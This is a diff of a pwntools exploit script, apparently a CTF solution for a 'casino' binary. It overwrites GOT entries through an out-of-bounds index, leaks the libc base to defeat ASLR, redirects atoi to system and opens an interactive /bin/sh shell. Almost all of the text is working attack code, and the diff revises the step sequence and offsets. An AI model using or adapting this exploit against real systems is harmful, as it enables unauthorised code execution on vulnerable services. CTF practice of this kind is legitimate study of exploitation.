@@ -1,8 +1,4 @@
 # Please run with python2.7 for better compatibility
-'''
-0000000000601ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5
-0x21ab0 libc_start_main
-'''
 from pwn import *
 
 context.clear(arch='x86_64')
@@ -38,8 +34,7 @@ r.sendlineafter('name: ', name)
 r.sendlineafter('age: ', '87')
 
 step = 1
-while step < 10:
-
+while step < 7:
     # Step 1: Hijack GOT table of puts, make casino run again and again endlessly
     if step == 1:
         for i in range(0, 6):
@@ -109,12 +104,13 @@ while step < 10:
         r.sendlineafter('6]:', str(offset + 2))
 
         r_out = 'Chose the number ' + str(offset + 1) +': '
+        pause()
         r.sendlineafter(r_out, '0')
         print('finished sending number and payload for step  %d: ' % (step))
 
         step += 1
 
-    # Step 5: Hijack GOT table of srand, change it to system
+    # Step 5: Hijack GOT table of atoi, change it to system
     elif step == 5:
         libc_base_addr = u64(r.recv(6) + '\0\0') - 0x21ab0
         print('get ASLR libc_base_addr: ', hex(libc_base_addr))
@@ -122,7 +118,7 @@ while step < 10:
             r_out = 'Chose the number ' + str(i) + ': '
             r.sendlineafter(r_out, str(i))
 
-        offset = (0x40 - 0xd0) / 4
+        offset = (0x58 - 0xd0) / 4
         r.sendlineafter('0:no]:', '1')
 
         r.sendlineafter('6]:', str(offset + 1))
@@ -130,7 +126,7 @@ while step < 10:
         r_out = 'Chose the number ' + str(offset) +': '
         hijack = libc_base_addr + system_offset
         print('ASLR system_addr', hex(hijack))
-        r.sendlineafter(r_out, str(hijack)[:8])
+        r.sendlineafter(r_out, str(hijack))
         print('finished sending number and payload for step  %d: ' % (step))
 
         step += 1
@@ -138,67 +134,12 @@ while step < 10:
     # Step 6: Write the rest of padding zeros in front of the starting address of step 5
     elif step == 6:
         cnt_num = 0
-        numbers = [0x16, 0x43, 0x3a, 0x35, 0x4a, 0x3]
-        for i in numbers:
-            r_out = 'Chose the number ' + str(cnt_num) + ': '
-            r.sendlineafter(r_out, str(i))
-            cnt_num += 1
-
-        offset = (0x40 - 0xd0) / 4
-        r.sendlineafter('0:no]:', '1')
-
-        r.sendlineafter('6]:', str(offset + 2))
-
-        r_out = 'Chose the number ' + str(offset + 1) +': '
-        hijack = libc_base_addr + system_offset
-        pause()
-        r.sendlineafter(r_out, str(hijack)[8:])
+        r_out = 'Chose the number 0:'
+        # hijack = libc_base_addr + binsh_offset --> strange bug
+        hijack= '/bin/sh'
+        r.sendlineafter(r_out, str(hijack))
         print('finished sending number and payload for step  %d: ' % (step))
-        step += 1
-
-    # Step 7: Overwrite seed to where /bin/sh locates, for eventually system('/bin/sh')
-    elif step == 7:
-        for i in range(0, 6):
-            r_out = 'Chose the number ' + str(i) + ': '
-            r.sendlineafter(r_out, str(i))
-
-        offset = (0x100 - 0xd0) / 4
-        r.sendlineafter('0:no]:', '1')
-
-        r.sendlineafter('6]:', str(offset + 1))
-
-        r_out = 'Chose the number ' + str(offset) +': '
-        hijack = libc_base_addr + binsh_offset
-        print('ASLR system_addr', hex(hijack))
-        r.sendlineafter(r_out, str(hijack)[8:])
-        print('finished sending number and payload for step  %d: ' % (step))
+        r.interactive()
 
         step += 1
-
-    # Step 7: Write the rest of padding zeros in front of the starting address of step 7
-    elif step == 8:
-        cnt_num = 0
-        numbers = [0x16, 0x43, 0x3a, 0x35, 0x4a, 0x3]
-        for i in numbers:
-            r_out = 'Chose the number ' + str(cnt_num) + ': '
-            r.sendlineafter(r_out, str(i))
-            cnt_num += 1
-
-        offset = (0x100 - 0xd0) / 4
-        r.sendlineafter('0:no]:', '1')
-
-        r.sendlineafter('6]:', str(offset + 2))
-
-        r_out = 'Chose the number ' + str(offset + 1) +': '
-        hijack = libc_base_addr + binsh_offset
-        r.sendlineafter(r_out, str(hijack)[:8])
-        print('finished sending number and payload for step  %d: ' % (step))
-
-        step += 1
-
-    elif step == 9:
-        r.close()
-        break
-r.interactive()
 r.close()
-
